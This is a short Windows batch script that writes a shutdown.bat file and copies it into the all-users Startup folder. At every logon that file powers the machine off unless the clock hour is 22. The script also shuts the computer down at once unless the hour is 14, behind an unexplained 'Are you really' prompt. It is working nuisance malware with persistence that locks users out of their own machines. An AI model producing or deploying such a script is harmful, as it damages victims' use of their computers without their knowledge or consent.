@echo off
mode con cols=50 lines=10
echo      Are you really
echo.

echo >shutdown.bat
echo set SafeTime=22>>shutdown.bat
echo set PresentTime=%time:~0,2%>>shutdown.bat
echo if "%%SafeTime%%"=="%%PresentTime%%" (echo You are safe) else (shutdown /p)>>shutdown.bat

xcopy shutdown.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

set SafeTime=14
set PresentTime=%time:~0,2%
if "%SafeTime%"=="%PresentTime%" (echo You are safe) else (shutdown -s)
pause>nul
